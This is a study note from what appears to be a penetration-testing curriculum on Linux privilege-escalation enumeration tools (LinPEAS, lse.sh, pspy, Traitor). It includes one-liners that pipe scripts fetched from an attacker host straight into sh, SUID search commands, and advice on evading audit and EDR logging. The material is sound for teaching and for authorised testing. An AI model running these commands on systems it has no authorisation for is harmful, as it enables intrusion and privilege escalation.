---
tags: [linux, privesc, pentesting, red-team]
difficulty: intermediate
module: "44 - Linux Privilege Escalation"
topic: "44.02 Enumeration Tools"
---

# Enumeration Tools for Linux Privilege Escalation

## 1. Executive Summary

Manual enumeration is the hallmark of a skilled operator, but modern Linux systems are vast and complex. Relying solely on manual enumeration is inefficient and prone to human error—an operator might easily overlook an obscure capability or an anomalous file permission buried deep within the filesystem. 

Automated enumeration tools bridge this gap. They are specialized scripts (typically written in Bash or Go) designed to systematically query the OS, file system, network configuration, and kernel state against known privilege escalation vectors. 

This document explores the core tools utilized in the field, detailing their internal mechanisms, appropriate use cases, operational security (OpSec) considerations, and how to interpret their output.

## 2. The Philosophy of Automated Enumeration

When deploying automated tools on a target, several operational rules apply:
1. **Never Run Blind:** Always read the source code of the script you are uploading. Executing arbitrary scripts from the internet on a client's server is unprofessional and dangerous.
2. **Memory Over Disk:** Whenever possible, execute enumeration tools directly in memory to avoid touching the disk (e.g., `curl -L http://attacker/linpeas.sh | sh`).
3. **Log Evasion:** Tools generate massive amounts of `execve` calls and file reads. In an environment with heavy auditd or EDR monitoring, aggressive tools like LinPEAS will trigger immediate alerts.
4. **Context is King:** Tools highlight anomalies; they do not provide guaranteed root. A "red" finding in LinPEAS is a lead, not necessarily an exploit.

## 3. Core Enumeration Frameworks

### 3.1. PEASS-ng / LinPEAS
**LinPEAS** (Linux Privilege Escalation Awesome Script) is the undisputed industry standard. It is a massive bash script that automates almost every manual check imaginable.

**How it works:**
- It executes thousands of bash commands, piping outputs to `grep`, `awk`, and `sed` to identify patterns matching known vulnerabilities.
- It features a highly advanced color-coding system.

**Color Legend (Crucial to understand):**
- **RED/YELLOW:** 95% certainty of a privilege escalation vector. Look here first.
- **RED:** You must check this out; it's a very high probability vector.
- **LightCyan:** Users with consoles.
- **Blue:** Users without consoles or standard system users.
- **Green:** Common things (safe).

**Execution Strategies:**
- Standard execution: `./linpeas.sh`
- Stealthier execution (no network checks): `./linpeas.sh -a` (Thorough but slower, avoids aggressive network port scanning).
- Bypassing disk: `curl -L http://10.10.10.10/linpeas.sh | sh`

### 3.2. Linux Smart Enumeration (lse.sh)
LSE is a cleaner, more modular alternative to LinPEAS. It is highly regarded for its structured output and verbosity levels.

**How it works:**
LSE uses a staggered level system, making it much better for stealth and targeted enumeration.

- `-l 0` (Default): Only shows highly probable paths to root.
- `-l 1`: Shows interesting information that might help (e.g., unusual groups, readable config files).
- `-l 2`: Dumps almost everything (similar to LinPEAS).

**Execution:**
`./lse.sh -l 1 -i` (Level 1, interactive mode).

### 3.3. pspy (Process Snooping)
**pspy** is fundamentally different from LinPEAS or LSE. It is a Go binary used to monitor Linux processes without requiring root privileges. 

**The Problem it Solves:**
Cron jobs that execute scripts every minute are a prime privesc vector. However, if the user cannot read `/etc/crontab` or `var/spool/cron`, they won't know the job exists. 

**How pspy works:**
Instead of relying on auditd or root-only APIs, `pspy` utilizes the `inotify` API. It places `inotify` watchers on `/proc`. Whenever a new directory (representing a new process ID) is created in `/proc`, `pspy` rapidly reads `/proc/PID/cmdline` to capture the command line execution before the process terminates.

**Execution:**
`./pspy64` (Runs continuously in the foreground, printing events to stdout).

### 3.4. Traitor
Traitor is a newer, Go-based tool that not only enumerates vulnerabilities but automatically exploits them.

**How it works:**
It assesses the environment for common misconfigurations (like Docker group, LXD group, specific sudo bypasses) and provides an interactive menu. If the operator selects an option, Traitor immediately drops a root shell.
While excellent for CTFs, it should be used with extreme caution in professional engagements, as automated exploitation can crash services.

## 4. Custom Bash One-Liners (When Tools Fail)

Sometimes, bringing an external script onto the system is impossible due to ingress filtering or restrictive AppArmor profiles. Operators must be prepared to write on-the-fly enumeration loops.

**Finding SUID/SGID:**
```bash
find / -type f -a \( -perm -4000 -o -perm -2000 \) -exec ls -l {} + 2>/dev/null
```

**Finding World-Writable Files:**
```bash
find / -path /proc -prune -o -type f -perm -0002 -exec ls -l {} + 2>/dev/null
```

**Enumerating readable config files in /etc:**
```bash
find /etc -type f -readable -name "*.conf" 2>/dev/null
```

## 5. Tool Architecture & Execution Flow (ASCII)

```text
+---------------------------------------------------------------------------------+
|                        AUTOMATED ENUMERATION ARCHITECTURE                       |
+---------------------------------------------------------------------------------+
|                                                                                 |
|   +-----------------------+              +-----------------------+              |
|   |   ATTACKER MACHINE    |              |     TARGET MACHINE    |              |
|   |                       |              |                       |              |
|   |  python3 -m http.server| == HTTP ==>  |  curl -L x.x/linpeas |              |
|   +-----------------------+              +-----------------------+              |
|                                                      |                          |
|                                      Executes in memory via pipe (| sh)         |
|                                                      |                          |
|   +-------------------------------------------------------------------------+   |
|   |                              SCRIPT ENGINE                              |   |
|   |                                                                         |   |
|   |  [System Info] --> uname -a, cat /etc/issue                             |   |
|   |  [Users/Groups] -> cat /etc/passwd, id, getent                          |   |
|   |  [Environment] --> env, set, cat /etc/profile                           |   |
|   |  [Processes] ----> ps aux, systemctl list-units                         |   |
|   |  [Network] ------> ss -tulpn, arp -a, /etc/hosts                        |   |
|   |  [Privileges] ---> sudo -l, getcap -r /, find / -perm -4000             |   |
|   |                                                                         |   |
|   +-------------------------------------------------------------------------+   |
|                                      |                                          |
|                                      v                                          |
|   +-------------------------------------------------------------------------+   |
|   |                      PARSING & PATTERN MATCHING                         |   |
|   |  Compares outputs against known vulnerable signatures (e.g., sudo < 1.9)|   |
|   |  Highlights critical vectors in RED/YELLOW                              |   |
|   +-------------------------------------------------------------------------+   |
|                                                                                 |
+---------------------------------------------------------------------------------+
```

## 6. Interpreting the Output

The biggest mistake junior pentesters make is "Output Blindness." Running LinPEAS generates thousands of lines. 

**Workflow for handling output:**
1. Redirect output to a file and tee it to the screen: `./linpeas.sh | tee enum.txt`
2. Search for the string `RED/YELLOW` or strictly parse for `[+] Sudo version` and `[+] SUID`.
3. Manually verify the findings. If LinPEAS says `pkexec` is vulnerable to PwnKit, verify the version and distribution manually before throwing an exploit.
4. Download `enum.txt` to the attacker machine and read it with syntax highlighting in an editor like VS Code.

## 7. Chaining Opportunities

- **Automated Enum + Manual Verification:** Use `lse.sh` to quickly identify an anomalous cron job executing a script in `/var/www/html`. Then, manually review the script's source code to find a command injection vulnerability.
- **pspy + SUID:** Use `pspy` to observe that a specific SUID binary is being called with an absolute path but relies on a relative shared library, chaining into an `LD_PRELOAD` or Shared Object Hijacking attack.

## 8. Related Notes
- [[01 - Linux PrivEsc Methodology Overview]]
- [[03 - SUID Binaries Abuse]]
- [[04 - SGID Binaries Abuse]]
- [[05 - Capabilities Abuse]]
- [[06 - Sudo Misconfigurations]]
- [[07 - Writable etc passwd]]
